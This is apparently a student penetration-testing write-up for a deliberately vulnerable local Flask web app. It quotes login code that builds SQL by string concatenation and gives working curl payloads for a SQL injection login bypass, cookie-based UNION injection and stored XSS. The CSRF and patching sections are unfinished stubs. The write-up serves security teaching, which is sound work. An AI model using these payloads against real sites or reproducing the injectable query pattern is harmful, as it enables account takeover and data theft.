---
title: This Damned Vulnerable Snake!
date: 2024-05-04
author:
  - "0x42697262"
  - Orochi
  - Jinx
---

Authors:

- 0x42697262
- Jinx
- Orochi

# This Damned Vulnerable Snake!

## TL;DR

Here are the vulnerabilities and to exploit them:

### SQL Injection

```bash
curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR 1=1 --&password="
```

### Stored XSS

```bash
curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users --" --data-raw 'message=<script>alert(window.origin)</script>'
```

### CSRF

how

## Introduction

Another month, another machine problem.
However this time, we're diving into some white-box penetration testing, which means we have full access to the source code of the web server.

The instructions to install and run the server is already provided in the [writeup](./writeup/README.txt) directory.
Please read and follow the instructions to setup the Python Flask web server.

Once the server is up and running, visit [http://0.0.0.0:5000](http://0.0.0.0:5000) and be greeted with a remnant of the 90s internet web page login.
*It's ugly because there's no CSS.*

If using a web browser is annoying, use `curl`.

```bash
curl -L 'http://0.0.0.0:5000'
```

And return an HTML login page.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Login</title>
  </head>
  <body>
    <form method="post" action="/login">
      <label for="username">Username</label>
      <input name="username" type="text" />
      <label for="password">Password</label>
      <input name="password" type="password" />
      <input type="submit" value="Login" />
    </form>
  </body>
</html>
```

Then that's it.
That's the only thing that can be seen on the website without logging in.
There's no `robots.txt` because the web server is simple and small.

The mission of this machine problem?
It is to **find vulnerabilities** as much as possible and **exploit** them.

That is what we will be doing today!

## Exploitation

Since we have full access to the server already, there's no need to perform reconnaissance. 
Thus we will head straight to exploitation.

First up is the login page.
There is no need to **bruteforce** the login page as its vulnerability is obvious.

Take a look at this code, it is possible to perform SQL injection to it.

```python
@app.route("/login", methods=["GET", "POST"])
def login():
    cur = con.cursor()
    if request.method == "GET":
        if request.cookies.get("session_token"):
            res = cur.execute("SELECT username FROM users INNER JOIN sessions ON "
                              + "users.id = sessions.user WHERE sessions.token = '"
                              + request.cookies.get("session_token") + "'")
            user = res.fetchone()
            if user:
                return redirect("/home")

        return render_template("login.html")
    else:
        res = cur.execute("SELECT id from users WHERE username = '"
                    + request.form["username"]
                    + "' AND password = '"
                    + request.form["password"] + "'")
        user = res.fetchone()
        if user:
            token = secrets.token_hex()
            cur.execute("INSERT INTO sessions (user, token) VALUES ("
                        + str(user[0]) + ", '" + token + "');")
            con.commit()
            response = redirect("/home")
            response.set_cookie("session_token", token)
            return response
        else:
            return render_template("login.html", error="Invalid username and/or password!")
```

Notice that the flow of this code redirects to the homepage when a session is present but proceeds to the login page when one is not.

On the `GET` method request, the SQL code is vulnerable.
However, we won't be focusing on that.

### SQL Injection Authentication Bypass (aCVE-2024-1)

The simplest part is the `POST` request because even if we don't have full access to the source code, we can still conduct basic checks to determine if the server is vulnerable or not.

This part of the code can be exploited to bypass the login and allows us to use the first user index, usually admin or root in others.

```python
res = cur.execute("SELECT id from users WHERE username = '"
            + request.form["username"]
            + "' AND password = '"
            + request.form["password"] + "'")
```

To exploit this page, simply set the username to a SQL query that evaluates to `TRUE`.

- `228922' OR 1=1 --`
- `228922' OR TRUE --`

This would get parsed by the sqlite3 handler as

```sql
SELECT id from users WHERE username = '228922' OR 1=1 -- AND password = ''
```

> [!NOTE]
> `'` is used instead of `"` because that's what the source code uses.
> Otherwise, it's `"`.

And we're in!
We should now be greeted with

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Home</title>
  </head>
  <body>
    <h2>Welcome, alice!</h2>
    <a href="/logout">Logout</a>
    <h3>Posts</h3>
    <form method="post" action="/posts">
      <input type="text" name="message">
      <input type="submit" value="Post!">
    </form>
    <ul>
      No posts.
    </ul>
  </body>
</html>
```

And logged in as `alice`.

Unfortunately, the database only contains `alice` as the user (not even root or admin) and an unhashed password (which is very unsecure!!!).

Let's just call this **SQL Injection Authentication Bypass (aCVE-2024-1)** as some sort of a tracker for this machine problem (of course this CVE doesn't exist irl, a joke btw).

To explain how this works, the original SQL statement looks for a `username` if it exists then proceeds to verify the `password`.
But since we have modified the `WHERE` clause, it wouldn't matter if a username does not exist since it would always evaluate to `TRUE`.

This would mean that the SQL parameter would be similar to `SELECT id FROM users;` then only fetch the first result.


---

This will also create a new `session_token` every time.
curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=' UNION select 24 from users; --&password="

curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT '69420' as id, 'eli' as username FROM users LIMIT 1--" --data-raw 'message=<script>alert(window.origin); alert(177013)</script>'

curl 'http://0.0.0.0:5000/home'  -H 'Cookie: session_token=f5c8541ad5f844d551a4fc9f2554b821b437232324d32260e6d260c4603dbf8a' 

## Patching the vulnerabilities

change code bro
